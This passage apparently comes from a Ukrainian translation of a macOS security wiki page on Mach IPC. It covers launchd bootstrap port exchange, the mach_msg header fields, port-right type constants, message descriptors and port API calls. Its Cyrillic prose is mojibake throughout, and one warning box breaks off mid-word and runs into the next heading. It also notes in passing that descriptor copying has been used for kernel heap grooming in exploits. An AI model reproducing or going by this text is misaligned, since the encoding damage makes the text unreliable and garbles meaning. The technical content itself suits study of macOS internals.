* **launchd** –ø–µ—Ä–µ–≤—ñ—Ä—è—î, —á–∏ –ø—Ä–∞—Ü—é—î –∑–∞–¥–∞—á–∞, —ñ —è–∫—â–æ –Ω—ñ, **–∑–∞–ø—É—Å–∫–∞—î** —ó—ó.
* –ó–∞–¥–∞—á–∞ **A** (—Å–ª—É–∂–±–∞) –≤–∏–∫–æ–Ω—É—î **–ø–µ—Ä–µ–≤—ñ—Ä–∫—É —Ä–µ—î—Å—Ç—Ä–∞—Ü—ñ—ó –∑–∞–ø—É—Å–∫—É** (`bootstrap_check_in()`). –¢—É—Ç **–∑–∞–ø—É—Å–∫–æ–≤–∏–π** —Å–µ—Ä–≤–µ—Ä —Å—Ç–≤–æ—Ä—é—î –ü–†–ê–í–û –í–Ü–î–ü–†–ê–í–õ–ï–ù–ù–Ø, —É—Ç—Ä–∏–º—É—î –π–æ–≥–æ —Ç–∞ **–ø–µ—Ä–µ–¥–∞—î –ü–†–ê–í–û –û–¢–†–ò–ú–ê–ù–ù–Ø –ó–∞–¥–∞—á—ñ A**.
* launchd –∫–æ–ø—ñ—é—î **–ü–†–ê–í–û –í–Ü–î–ü–†–ê–í–õ–ï–ù–ù–Ø —Ç–∞ –≤—ñ–¥–ø—Ä–∞–≤–ª—è—î –π–æ–≥–æ –ó–∞–¥–∞—á—ñ B**.
* –ó–∞–¥–∞—á–∞ **B** –≥–µ–Ω–µ—Ä—É—î –Ω–æ–≤–∏–π –ø–æ—Ä—Ç –∑ **–ü–†–ê–í–û–ú –û–¢–†–ò–ú–ê–ù–ù–Ø** —Ç–∞ **–ü–†–ê–í–û–ú –í–Ü–î–ü–†–ê–í–õ–ï–ù–ù–Ø**, —ñ –¥–∞—î **–ü–†–ê–í–û –í–Ü–î–ü–†–ê–í–õ–ï–ù–ù–Ø –ó–∞–¥–∞—á—ñ A** (—Å–ª—É–∂–±—ñ), —â–æ–± –≤–æ–Ω–∞ –º–æ–≥–ª–∞ –≤—ñ–¥–ø—Ä–∞–≤–ª—è—Ç–∏ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –ó–ê–î–ê–ß–Ü B (–¥–≤–æ–Ω–∞–ø—Ä—è–º–ª–µ–Ω–µ —Å–ø—ñ–ª–∫—É–≤–∞–Ω–Ω—è).

–û–¥–Ω–∞–∫ —Ü–µ–π –ø—Ä–æ—Ü–µ—Å –∑–∞—Å—Ç–æ—Å–æ–≤—É—î—Ç—å—Å—è –ª–∏—à–µ –¥–æ –ø–æ–ø–µ—Ä–µ–¥–Ω—å–æ –≤–∏–∑–Ω–∞—á–µ–Ω–∏—Ö —Å–∏—Å—Ç–µ–º–Ω–∏—Ö –∑–∞–¥–∞—á. –ù–µ—Å–∏—Å—Ç–µ–º–Ω—ñ –∑–∞–¥–∞—á—ñ –≤—Å–µ —â–µ –ø—Ä–∞—Ü—é—é—Ç—å, —è–∫ –æ–ø–∏—Å–∞–Ω–æ —Ä–∞–Ω—ñ—à–µ, —â–æ –ø–æ—Ç–µ–Ω—Ü—ñ–π–Ω–æ –º–æ–∂–µ –¥–æ–∑–≤–æ–ª–∏—Ç–∏ –ø—ñ–¥—Ä–æ–±–∫—É.

{% hint style="danger" %}
–û—Ç–∂–µ, launchd –Ω–µ –ø–æ–≤–∏–Ω–µ–Ω –Ω—ñ–∫–æ–ª–∏ –∞–≤–∞—Ä—ñ–π–Ω–æ –∑–∞–≤–µ—Ä—à—É–≤–∞—Ç–∏ —Ä–æ–±–æ—Ç—É, —ñ–Ω–∞–∫—à–µ –≤–µ—Å—å —Å–∏—Å—Ç–µ–º–∞ –∞–≤–∞—Ä—ñ–π–Ω–æ –∑–∞–≤–µ—Ä—à–∏—Ç—å —Ä–æ–±–æ—Ç
### –ü–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è Mach

[–ó–Ω–∞–π–¥—ñ—Ç—å –±—ñ–ª—å—à–µ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó —Ç—É—Ç](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)

–§—É–Ω–∫—Ü—ñ—è `mach_msg`, —è–∫–∞ –≤ —Å—É—Ç—ñ —î —Å–∏—Å—Ç–µ–º–Ω–∏–º –≤–∏–∫–ª–∏–∫–æ–º, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –¥–ª—è –Ω–∞–¥—Å–∏–ª–∞–Ω–Ω—è —Ç–∞ –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω—å Mach. –§—É–Ω–∫—Ü—ñ—è –≤–∏–º–∞–≥–∞—î, —â–æ–± –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –±—É–ª–æ –Ω–∞–¥—ñ—Å–ª–∞–Ω–æ —è–∫ –ø–æ—á–∞—Ç–∫–æ–≤–∏–π –∞—Ä–≥—É–º–µ–Ω—Ç. –¶–µ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –ø–æ–≤–∏–Ω–Ω–æ –ø–æ—á–∏–Ω–∞—Ç–∏—Å—è –∑—ñ —Å—Ç—Ä—É–∫—Ç—É—Ä–∏ `mach_msg_header_t`, –∑–∞ —è–∫–æ—é –π–¥–µ –≤–º—ñ—Å—Ç —Å–∞–º–æ–≥–æ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è. –°—Ç—Ä—É–∫—Ç—É—Ä–∞ –≤–∏–∑–Ω–∞—á–∞—î—Ç—å—Å—è –Ω–∞—Å—Ç—É–ø–Ω–∏–º —á–∏–Ω–æ–º:
```c
typedef struct {
mach_msg_bits_t               msgh_bits;
mach_msg_size_t               msgh_size;
mach_port_t                   msgh_remote_port;
mach_port_t                   msgh_local_port;
mach_port_name_t              msgh_voucher_port;
mach_msg_id_t                 msgh_id;
} mach_msg_header_t;
```
–ü—Ä–æ—Ü–µ—Å–∏, —è–∫—ñ –º–∞—é—Ç—å _**–ø—Ä–∞–≤–æ –Ω–∞ –æ—Ç—Ä–∏–º–∞–Ω–Ω—è**_, –º–æ–∂—É—Ç—å –æ—Ç—Ä–∏–º—É–≤–∞—Ç–∏ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –Ω–∞ –ø–æ—Ä—Ç—ñ Mach. –ù–∞—Ç–æ–º—ñ—Å—Ç—å **–≤—ñ–¥–ø—Ä–∞–≤–Ω–∏–∫–∏** –º–∞—é—Ç—å _**–ø—Ä–∞–≤–æ –Ω–∞ –≤—ñ–¥–ø—Ä–∞–≤–∫—É**_ –∞–±–æ _**–ø—Ä–∞–≤–æ –Ω–∞ –≤—ñ–¥–ø—Ä–∞–≤–∫—É –æ–¥–Ω–æ–≥–æ —Ä–∞–∑—É**_. –ü—Ä–∞–≤–æ –Ω–∞ –≤—ñ–¥–ø—Ä–∞–≤–∫—É –æ–¥–Ω–æ–≥–æ —Ä–∞–∑—É –ø—Ä–∏–∑–Ω–∞—á–µ–Ω–µ –≤–∏–∫–ª—é—á–Ω–æ –¥–ª—è –≤—ñ–¥–ø—Ä–∞–≤–ª–µ–Ω–Ω—è –æ–¥–Ω–æ–≥–æ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è, –ø—ñ—Å–ª—è —á–æ–≥–æ –≤–æ–Ω–æ —Å—Ç–∞—î –Ω–µ–¥—ñ–π—Å–Ω–∏–º.

–ü–æ—á–∞—Ç–∫–æ–≤–µ –ø–æ–ª–µ **`msgh_bits`** —î –±—ñ—Ç–æ–≤–æ—é –º–∞—Å–∫–æ—é:

* –ü–µ—Ä—à–∏–π –±—ñ—Ç (–Ω–∞–π–±—ñ–ª—å—à –∑–Ω–∞—á—É—â–∏–π) –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –¥–ª—è –ø–æ–∑–Ω–∞—á–µ–Ω–Ω—è —Ç–æ–≥–æ, —â–æ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è —Å–∫–ª–∞–¥–Ω–µ (–¥–æ–∫–ª–∞–¥–Ω—ñ—à–µ –¥–∏–≤. –Ω–∏–∂—á–µ)
* 3-–π —Ç–∞ 4-–π –±—ñ—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å—Å—è —è–¥—Ä–æ–º
* **5 –º–µ–Ω—à –∑–Ω–∞—á—É—â–∏—Ö –±—ñ—Ç—ñ–≤ 2-–≥–æ –±–∞–π—Ç—É** –º–æ–∂—É—Ç—å –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω—ñ –¥–ª—è **–≤–∞—É—á–µ—Ä–∞**: —ñ–Ω—à–æ–≥–æ —Ç–∏–ø—É –ø–æ—Ä—Ç—É –¥–ª—è –≤—ñ–¥–ø—Ä–∞–≤–∫–∏ –∫–æ–º–±—ñ–Ω–∞—Ü—ñ–π –∫–ª—é—á/–∑–Ω–∞—á–µ–Ω–Ω—è.
* **5 –º–µ–Ω—à –∑–Ω–∞—á—É—â–∏—Ö –±—ñ—Ç—ñ–≤ 3-–≥–æ –±–∞–π—Ç—É** –º–æ–∂—É—Ç—å –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω—ñ –¥–ª—è **–ª–æ–∫–∞–ª—å–Ω–æ–≥–æ –ø–æ—Ä—Ç—É**
* **5 –º–µ–Ω—à –∑–Ω–∞—á—É—â–∏—Ö –±—ñ—Ç—ñ–≤ 4-–≥–æ –±–∞–π—Ç—É** –º–æ–∂—É—Ç—å –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω—ñ –¥–ª—è **–≤—ñ–¥–¥–∞–ª–µ–Ω–æ–≥–æ –ø–æ—Ä—Ç—É**

–¢–∏–ø–∏, —è–∫—ñ –º–æ–∂—É—Ç—å –±—É—Ç–∏ –≤–∫–∞–∑–∞–Ω—ñ —É –≤–∞—É—á–µ—Ä—ñ, –ª–æ–∫–∞–ª—å–Ω–∏—Ö —Ç–∞ –≤—ñ–¥–¥–∞–ª–µ–Ω–∏—Ö –ø–æ—Ä—Ç–∞—Ö, –≤–∏–∑–Ω–∞—á–µ–Ω—ñ —É —Ñ–∞–π–ª—ñ [**mach/message.h**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html):
```c
#define MACH_MSG_TYPE_MOVE_RECEIVE      16      /* Must hold receive right */
#define MACH_MSG_TYPE_MOVE_SEND         17      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MOVE_SEND_ONCE    18      /* Must hold sendonce right */
#define MACH_MSG_TYPE_COPY_SEND         19      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MAKE_SEND         20      /* Must hold receive right */
#define MACH_MSG_TYPE_MAKE_SEND_ONCE    21      /* Must hold receive right */
#define MACH_MSG_TYPE_COPY_RECEIVE      22      /* NOT VALID */
#define MACH_MSG_TYPE_DISPOSE_RECEIVE   24      /* must hold receive right */
#define MACH_MSG_TYPE_DISPOSE_SEND      25      /* must hold send right(s) */
#define MACH_MSG_TYPE_DISPOSE_SEND_ONCE 26      /* must hold sendonce right */
```
–ù–∞–ø—Ä–∏–∫–ª–∞–¥, `MACH_MSG_TYPE_MAKE_SEND_ONCE` –º–æ–∂–µ –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–∏–π –¥–ª—è **–≤–∫–∞–∑—ñ–≤–∫–∏** —Ç–æ–≥–æ, —â–æ **–ø—Ä–∞–≤–æ –Ω–∞ –≤—ñ–¥–ø—Ä–∞–≤–∫—É –æ–¥–∏–Ω —Ä–∞–∑** –ø–æ–≤–∏–Ω–Ω–æ –±—É—Ç–∏ –ø–æ—Ö—ñ–¥–Ω–µ —Ç–∞ –ø–µ—Ä–µ–¥–∞–Ω–µ –¥–ª—è —Ü—å–æ–≥–æ –ø–æ—Ä—Ç—É. –¢–∞–∫–æ–∂ –º–æ–∂–µ –±—É—Ç–∏ –≤–∫–∞–∑–∞–Ω–æ `MACH_PORT_NULL`, —â–æ–± –∑–∞–ø–æ–±—ñ–≥—Ç–∏ –æ—Ç—Ä–∏–º—É–≤–∞—á—É –º–∞—Ç–∏ –º–æ–∂–ª–∏–≤—ñ—Å—Ç—å –≤—ñ–¥–ø–æ–≤—ñ—Å—Ç–∏.

–î–ª—è –¥–æ—Å—è–≥–Ω–µ–Ω–Ω—è –ø—Ä–æ—Å—Ç–æ—ó **–¥–≤–æ—Å—Ç–æ—Ä–æ–Ω–Ω—å–æ—ó –∫–æ–º—É–Ω—ñ–∫–∞—Ü—ñ—ó** –ø—Ä–æ—Ü–µ—Å –º–æ–∂–µ –≤–∫–∞–∑–∞—Ç–∏ **mach –ø–æ—Ä—Ç** —É –∑–∞–≥–æ–ª–æ–≤–∫—É mach **–ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è**, —è–∫–∏–π –Ω–∞–∑–∏–≤–∞—î—Ç—å—Å—è _–ø–æ—Ä—Ç–æ–º –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ_ (**`msgh_local_port`**), –∫—É–¥–∏ **–æ—Ç—Ä–∏–º—É–≤–∞—á** –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –º–æ–∂–µ **–≤—ñ–¥–ø—Ä–∞–≤–∏—Ç–∏ –≤—ñ–¥–ø–æ–≤—ñ–¥—å** –Ω–∞ —Ü–µ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è.

{% hint style="success" %}
–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ —Ü–µ–π –≤–∏–¥ –¥–≤–æ—Å—Ç–æ—Ä–æ–Ω–Ω—å–æ—ó –∫–æ–º—É–Ω—ñ–∫–∞—Ü—ñ—ó –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –≤ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è—Ö XPC, —è–∫—ñ –æ—á—ñ–∫—É—é—Ç—å –≤—ñ–¥–ø–æ–≤—ñ–¥—ñ (`xpc_connection_send_message_with_reply` —Ç–∞ `xpc_connection_send_message_with_reply_sync`). –ü—Ä–æ—Ç–µ, **–∑–∞–∑–≤–∏—á–∞–π —Å—Ç–≤–æ—Ä—é—é—Ç—å—Å—è —Ä—ñ–∑–Ω—ñ –ø–æ—Ä—Ç–∏**, —è–∫ –ø–æ—è—Å–Ω–µ–Ω–æ —Ä–∞–Ω—ñ—à–µ, –¥–ª—è —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è –¥–≤–æ—Å—Ç–æ—Ä–æ–Ω–Ω—å–æ—ó –∫–æ–º—É–Ω—ñ–∫–∞—Ü—ñ—ó.
{% endhint %}

–Ü–Ω—à—ñ –ø–æ–ª—è –∑–∞–≥–æ–ª–æ–≤–∫–∞ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è:

* `msgh_size`: —Ä–æ–∑–º—ñ—Ä –≤—Å—å–æ–≥–æ –ø–∞–∫–µ—Ç–∞.
* `msgh_remote_port`: –ø–æ—Ä—Ç, –Ω–∞ —è–∫–∏–π –≤—ñ–¥–ø—Ä–∞–≤–ª–µ–Ω–æ —Ü–µ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è.
* `msgh_voucher_port`: [mach –≤–∞—É—á–µ—Ä–∏](https://robert.sesek.com/2023/6/mach\_vouchers.html).
* `msgh_id`: —ñ–¥–µ–Ω—Ç–∏—Ñ—ñ–∫–∞—Ç–æ—Ä —Ü—å–æ–≥–æ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è, —è–∫–∏–π —ñ–Ω—Ç–µ—Ä–ø—Ä–µ—Ç—É—î—Ç—å—Å—è –æ—Ç—Ä–∏–º—É–≤–∞—á–µ–º.

{% hint style="danger" %}
–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ **mach –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –≤—ñ–¥–ø—Ä–∞–≤–ª—è—é—Ç—å—Å—è —á–µ—Ä–µ–∑ `mach –ø–æ—Ä—Ç`**, —è–∫–∏–π —î **–∫–∞–Ω–∞–ª–æ–º –∑–≤'—è–∑–∫—É –æ–¥–∏–Ω –¥–æ –æ–¥–Ω–æ–≥–æ**, **–±—É–¥—É—î—Ç—å—Å—è –≤ —è–¥—Ä—ñ mach**. **–î–µ–∫—ñ–ª—å–∫–∞ –ø—Ä–æ—Ü–µ—Å—ñ–≤** –º–æ–∂—É—Ç—å **–≤—ñ–¥–ø—Ä–∞–≤–ª—è—Ç–∏ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è** –Ω–∞ mach –ø–æ—Ä—Ç, –∞–ª–µ –≤ –±—É–¥—å-—è–∫–∏–π –º–æ–º–µ–Ω—Ç —Ç—ñ–ª—å–∫–∏ **–æ–¥–∏–Ω –ø—Ä–æ—Ü–µ—Å –º–æ–∂–µ —á–∏—Ç–∞—Ç–∏** –∑ –Ω—å–æ–≥–æ.
{% endhint %}

–ü–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –ø–æ—Ç—ñ–º —Ñ–æ—Ä–º—É—é—Ç—å—Å—è –∑–∞–≥–æ–ª–æ–≤–∫–æ–º **`mach_msg_header_t`**, –∑–∞ —è–∫–∏–º —Å–ª—ñ–¥—É—î **—Ç—ñ–ª–æ** —Ç–∞ **—Ç—Ä–µ–π–ª–µ—Ä** (—è–∫—â–æ —î) —ñ –º–æ–∂–µ –Ω–∞–¥–∞–≤–∞—Ç–∏ –¥–æ–∑–≤—ñ–ª –Ω–∞ –≤—ñ–¥–ø–æ–≤—ñ–¥—å –Ω–∞ –Ω—å–æ–≥–æ. –£ —Ü–∏—Ö –≤–∏–ø–∞–¥–∫–∞—Ö —è–¥—Ä–æ –ø—Ä–æ—Å—Ç–æ –ø–æ–≤–∏–Ω–Ω–æ –ø–µ—Ä–µ–¥–∞—Ç–∏ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –≤—ñ–¥ –æ–¥–Ω–æ–≥–æ –∑–∞–≤–¥–∞–Ω–Ω—è –¥–æ —ñ–Ω—à–æ–≥–æ.

**–¢—Ä–µ–π–ª–µ—Ä** - —Ü–µ **—ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—è, –¥–æ–¥–∞–Ω–∞ –¥–æ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è —è–¥—Ä–æ–º** (–Ω–µ –º–æ–∂–µ –±—É—Ç–∏ –≤—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∞ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–µ–º), —è–∫—É –º–æ–∂–Ω–∞ –∑–∞–ø—Ä–æ—Å–∏—Ç–∏ –ø—Ä–∏ –æ—Ç—Ä–∏–º–∞–Ω–Ω—ñ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –∑ –ø—Ä–∞–ø–æ—Ä—Ü—è–º–∏ `MACH_RCV_TRAILER_<trailer_opt>` (—ñ—Å–Ω—É—î —Ä—ñ–∑–Ω–∞ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—è, —è–∫—É –º–æ–∂–Ω–∞ –∑–∞–ø—Ä–æ—Å–∏—Ç–∏).

#### –°–∫–ª–∞–¥–Ω—ñ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è

–ü—Ä–æ—Ç–µ, —î —ñ–Ω—à—ñ –±—ñ–ª—å—à **—Å–∫–ª–∞–¥–Ω—ñ** –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥, —Ç—ñ, —è–∫—ñ –ø–µ—Ä–µ–¥–∞—é—Ç—å –¥–æ–¥–∞—Ç–∫–æ–≤—ñ –ø—Ä–∞–≤–∞ –ø–æ—Ä—Ç—É –∞–±–æ —Å–ø—ñ–ª—å–Ω–∏–π –¥–æ—Å—Ç—É–ø –¥–æ –ø–∞–º'—è—Ç—ñ, –¥–µ —è–¥—Ä–æ —Ç–∞–∫–æ–∂ –ø–æ–≤–∏–Ω–Ω–æ –Ω–∞–¥—ñ—Å–ª–∞—Ç–∏ —Ü—ñ –æ–±'—î–∫—Ç–∏ –æ—Ç—Ä–∏–º—É–≤–∞—á–µ–≤—ñ. –£ —Ü–∏—Ö –≤–∏–ø–∞–¥–∫–∞—Ö –Ω–∞–π–±—ñ–ª—å—à –∑–Ω–∞—á—É—â–∏–π –±—ñ—Ç –∑–∞–≥–æ–ª–æ–≤–∫–∞ `msgh_bits` –≤—Å—Ç–∞–Ω–æ–≤–ª—é—î—Ç—å—Å—è.

–ú–æ–∂–ª–∏–≤—ñ –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä–∏ –¥–ª—è –ø–µ—Ä–µ–¥–∞—á—ñ –≤–∏–∑–Ω–∞—á–µ–Ω—ñ –≤ [**`mach/message.h`**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html):
```c
#define MACH_MSG_PORT_DESCRIPTOR                0
#define MACH_MSG_OOL_DESCRIPTOR                 1
#define MACH_MSG_OOL_PORTS_DESCRIPTOR           2
#define MACH_MSG_OOL_VOLATILE_DESCRIPTOR        3
#define MACH_MSG_GUARDED_PORT_DESCRIPTOR        4

#pragma pack(push, 4)

typedef struct{
natural_t                     pad1;
mach_msg_size_t               pad2;
unsigned int                  pad3 : 24;
mach_msg_descriptor_type_t    type : 8;
} mach_msg_type_descriptor_t;
```
–£ 32 –±—ñ—Ç–∞—Ö –≤—Å—ñ –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä–∏ –º–∞—é—Ç—å —Ä–æ–∑–º—ñ—Ä 12 –±–∞–π—Ç—ñ–≤, –∞ —Ç–∏–ø –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä–∞ –∑–Ω–∞—Ö–æ–¥–∏—Ç—å—Å—è –≤ 11-–º—É. –£ 64 –±—ñ—Ç–∞—Ö —Ä–æ–∑–º—ñ—Ä–∏ –≤—ñ–¥—Ä—ñ–∑–Ω—è—é—Ç—å—Å—è.

{% hint style="danger" %}
–Ø–¥—Ä–æ —Å–∫–æ–ø—ñ—é—î –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä–∏ –∑ –æ–¥–Ω–æ–≥–æ –∑–∞–≤–¥–∞–Ω–Ω—è –≤ —ñ–Ω—à–µ, –∞–ª–µ —Å–ø–æ—á–∞—Ç–∫—É **—Å—Ç–≤–æ—Ä—é—î –∫–æ–ø—ñ—é –≤ –ø–∞–º'—è—Ç—ñ —è–¥—Ä–∞**. –¶—é —Ç–µ—Ö–Ω—ñ–∫—É, –≤—ñ–¥–æ–º—É —è–∫ "Feng Shui", –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞–ª–∏ –≤ –∫—ñ–ª—å–∫–æ—Ö –µ–∫—Å–ø–ª–æ–π—Ç–∞—Ö –¥–ª—è —Ç–æ–≥–æ, —â–æ–± –∑–º—É—Å–∏—Ç–∏ **—è–¥—Ä–æ –∫–æ–ø—ñ—é–≤–∞—Ç–∏ –¥–∞–Ω—ñ –≤ —Å–≤–æ—ó–π –ø–∞–º'—è—Ç—ñ**, –∑–º—É—à—É—é—á–∏ –ø—Ä–æ—Ü–µ—Å –Ω–∞–¥—Å–∏–ª–∞—Ç–∏ –¥–µ—Å–∫—Ä–∏–ø—Ç–æ—Ä–∏ —Å–∞–º–æ–º—É —Å–æ–±—ñ. –ü–æ—Ç—ñ–º –ø—Ä–æ—Ü–µ—Å –º–æ–∂–µ –æ—Ç—Ä–∏–º–∞—Ç–∏ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è (—è–¥—Ä–æ —ó—Ö –∑–≤—ñ–ª—å–Ω–∏—Ç—å).

–¢–∞–∫–æ–∂ –º–æ–∂–ª–∏–≤–æ **–Ω–∞–¥—ñ—Å–ª–∞—Ç–∏ –ø—Ä–∞–≤–∞ –ø–æ—Ä—Ç—É –≤—Ä–∞–∑–ª–∏–≤–æ–º—É –ø—Ä–æ—Ü–µ—Å—É**, —ñ –ø—Ä–∞–≤–∞ –ø–æ—Ä—Ç—É –ø—Ä–æ—Å—Ç–æ –∑'—è–≤–ª—è—Ç—å—Å—è –≤ –ø—Ä–æ—Ü–µ—Å—ñ (–Ω–∞–≤—ñ—Ç—å —è–∫—â–æ –≤—ñ–Ω –Ω–µ –æ–±—Ä–æ–±–ª—è—î —ó—Ö).
{% endhint %}

### API –ø–æ—Ä—Ç—ñ–≤ Mac

–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ –ø–æ—Ä—Ç–∏ –ø–æ–≤'—è–∑–∞–Ω—ñ –∑ –ø—Ä–æ—Å—Ç–æ—Ä–æ–º —ñ–º–µ–Ω –∑–∞–≤–¥–∞–Ω–Ω—è, —Ç–æ–º—É –¥–ª—è —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è –∞–±–æ –ø–æ—à—É–∫—É –ø–æ—Ä—Ç—É —Ç–∞–∫–æ–∂ –∑–∞–ø–∏—Ç—É—î—Ç—å—Å—è –ø—Ä–æ—Å—Ç—ñ—Ä —ñ–º–µ–Ω –∑–∞–≤–¥–∞–Ω–Ω—è (–¥–æ–∫–ª–∞–¥–Ω—ñ—à–µ –≤ `mach/mach_port.h`):

* **`mach_port_allocate` | `mach_port_construct`**: **–°—Ç–≤–æ—Ä–∏—Ç–∏** –ø–æ—Ä—Ç.
* `mach_port_allocate` —Ç–∞–∫–æ–∂ –º–æ–∂–µ —Å—Ç–≤–æ—Ä–∏—Ç–∏ **–Ω–∞–±—ñ—Ä –ø–æ—Ä—Ç—ñ–≤**: –ø—Ä–∞–≤–æ –Ω–∞ –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –Ω–∞–¥ –≥—Ä—É–ø–æ—é –ø–æ—Ä—Ç—ñ–≤. –ö–æ–∂–Ω–æ–≥–æ —Ä–∞–∑—É, –∫–æ–ª–∏ –æ—Ç—Ä–∏–º—É—î—Ç—å—Å—è –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è, –≤–∫–∞–∑—É—î—Ç—å—Å—è –ø–æ—Ä—Ç, –∑–≤—ñ–¥–∫–∏ –≤–æ–Ω–æ –±—É–ª–æ –æ—Ç—Ä–∏–º–∞–Ω–æ.
* `mach_port_allocate_name`: –ó–º—ñ–Ω–∏—Ç–∏ —ñ–º'—è –ø–æ—Ä—Ç—É (–∑–∞ –∑–∞–º–æ–≤—á—É–≤–∞–Ω–Ω—è–º —Ü–µ 32-–±—ñ—Ç–Ω–µ —Ü—ñ–ª–µ —á–∏—Å–ª–æ)
* `mach_port_names`: –û—Ç—Ä–∏–º–∞—Ç–∏ —ñ–º–µ–Ω–∞ –ø–æ—Ä—Ç—ñ–≤ –∑ —Ü—ñ–ª—å–æ–≤–æ–≥–æ –æ–±'—î–∫—Ç–∞
* `mach_port_type`: –û—Ç—Ä–∏–º–∞—Ç–∏ –ø—Ä–∞–≤–∞ –∑–∞–≤–¥–∞–Ω–Ω—è –Ω–∞ —ñ–º'—è
* `mach_port_rename`: –ü–µ—Ä–µ–π–º–µ–Ω—É–≤–∞—Ç–∏ –ø–æ—Ä—Ç (—è–∫ dup2 –¥–ª—è FDs)
* `mach_port_allocate`: –í–∏–¥—ñ–ª–∏—Ç–∏ –Ω–æ–≤–∏–π –û–¢–†–ò–ú–ê–¢–ò, –ü–û–†–¢\_–ù–ê–ë–Ü–† –∞–±–æ DEAD\_NAME
* `mach_port_insert_right`: –°—Ç–≤–æ—Ä–∏—Ç–∏ –Ω–æ–≤–µ –ø—Ä–∞–≤–æ –≤ –ø–æ—Ä—Ç—É, –¥–µ —É –≤–∞—Å —î –û–¢–†–ò–ú–ê–¢–ò
* `mach_port_...`
* **`mach_msg`** | **`mach_msg_overwrite`**: –§—É–Ω–∫—Ü—ñ—ó, —â–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—é—Ç—å—Å—è –¥–ª—è **–Ω–∞–¥—Å–∏–ª–∞–Ω–Ω—è —Ç–∞ –æ—Ç—Ä–∏–º–∞–Ω–Ω—è mach-–ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω—å**. –í–µ—Ä—Å—ñ—è –∑ –ø–µ—Ä–µ–∑–∞–ø–∏—Å–æ–º –¥–æ–∑–≤–æ–ª—è—î –≤–∫–∞–∑–∞—Ç–∏ —ñ–Ω—à–∏–π –±—É—Ñ–µ—Ä –¥–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è (—ñ–Ω—à–∞ –≤–µ—Ä—Å—ñ—è –ø—Ä–æ—Å—Ç–æ –ø–æ–≤—Ç–æ—Ä–Ω–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î –π–æ–≥–æ).

### –ù–∞–ª–∞–≥–æ–¥–∂–µ–Ω–Ω—è mach\_msg

